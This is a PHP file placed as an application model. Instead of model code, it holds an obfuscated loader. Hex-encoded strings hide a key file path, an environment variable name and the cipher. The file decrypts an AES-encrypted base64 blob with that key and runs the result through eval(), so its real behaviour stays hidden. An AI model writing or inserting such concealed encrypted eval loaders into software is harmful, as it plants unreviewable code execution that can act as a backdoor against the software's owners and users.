<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('LgtfwAWhbauef0xf/HiiRw==');

$c=base64_decode(

'qzOaK0BCm58lFpfB6rP5/oj204pQQVs3/qYR1VdRbSwplrM41kDwxG/FZmZgLG0OnrNLq23scCOP' .
'aJwBiJ0VvVrOJdXLmwOiy7lribUupy/f+VZSBG1faHl+K+T8ksUkwrnJvoEGRXmpDl/6tqz5fb9i' .
'TvQtZ5jgJd6tbxUH29Gj4Lw7kHEhMk4s6NL7bhDanll5hGy8oOeZ+RqNycXkvFaGqlDk72MdBjKc' .
'EJMhUwEwKGNEKrZybrI7eCmWex/Py/yxbgf7otRFbh/+fMHM31or4nubLFoattLetBD7xY+YnH3a' .
'pJIw8oVu6vNa57sqtFayeVgn/QOrhdVpJ/YTUDu5Lzo60JRXV4m37DqBowNg2EPZbTelkn0I3mk2' .
'JVITb7xkr7czGDxPnaLgywOCBJq+BosNur513IIatL7LbCiRfOBynSEwwbk4XKJNy+uNWG6Ae/Ry' .
'WXoNMb82aYc3HKmnFEkvWFLxQZYubrLpxDrCMpDFtFlrZJZj9CSIFj+1Qel91MKHKYJ/GdIeosrG' .
'q9MI5ohA2U/vYxq4p58GwyZUrxMNngUQIbp27Ii6+aDQaTUk4EH25vbdv++/RGqLaSXkIs7lK89F' .
'ZXpq7GUhbDGhVqzskfQm6Qb56tJrQuquxSlc/jYyTdeKt6JiZ6PiDuHldyOKqi7zEVPTQMOILGK1' .
'uF2MD82j0iuRiVODOrUNbCbTJqX5Nk5JUO592uF+nV2/S/3fS+egnQEcc7gqGXM212nkY5KMzHNq' .
'KksttbaKQFmGA8J8B8jfxPskfwhFW5xZy5kY+tku9RQiMqZ6jTpxRtvL+Gi1kSJBS9+HnFRJ3l/Z' .
'wVQC5K41ArVVlGBIqHiefu42hN8pCzUiEuDJD/0Qlig4h5JZUrKc+wr8/OLp'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

